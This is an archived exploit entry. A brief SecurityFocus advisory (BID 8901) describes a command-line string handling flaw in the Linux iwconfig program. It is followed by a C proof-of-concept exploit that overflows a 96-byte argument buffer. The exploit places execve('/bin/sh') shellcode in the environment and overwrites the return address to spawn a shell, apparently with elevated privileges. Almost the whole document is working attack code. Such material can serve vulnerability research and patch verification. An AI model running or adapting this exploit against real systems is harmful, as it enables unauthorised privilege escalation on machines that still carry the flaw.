// source: https://www.securityfocus.com/bid/8901/info

A problem has been identified in the iwconfig program when handling strings on the commandline. Because of this, a local attacker may be able to gain elevated privileges.

Exploit:
/* PST_iwconfig
   /sbin/iwconfig proof of concept exploit
   coded by aXis@ph4nt0m.net
   Ph4nt0m Security Team
   http://www.ph4nt0m.net
   just for fun
*/

#include<stdio.h>
#include<string.h>
#include<unistd.h>

/* Copyright (c) Ramon de Carvalho Valle July 2003 */
/* x86/linux shellcode */

char shellcode[]= /* 24 bytes */
    "\x31\xc0" /* xorl %eax,%eax */
    "\x50" /* pushl %eax */
    "\x68\x2f\x2f\x73\x68" /* pushl $0x68732f2f */
    "\x68\x2f\x62\x69\x6e" /* pushl $0x6e69622f */
    "\x89\xe3" /* movl %esp,%ebx */
    "\x50" /* pushl %eax */
    "\x53" /* pushl %ebx */
    "\x89\xe1" /* movl %esp,%ecx */
    "\x99" /* cltd */
    "\xb0\x0b" /* movb $0x0b,%al */
    "\xcd\x80"; /* int $0x80 */


int main(int argc,char **argv){
   char buf[96];
   unsigned long ret;
   int i;

   char *prog[]={"/sbin/iwconfig",buf,NULL};
   char *env[]={"HOME=/",shellcode,NULL};

   ret=0xc0000000-strlen(shellcode)-strlen(prog[0])-0x06;
   printf("use ret addr: 0x%x\n",ret);

   memset(buf,0x41,sizeof(buf));
   memcpy(&buf[92],&ret,4);

   execve(prog[0],prog,env);

  }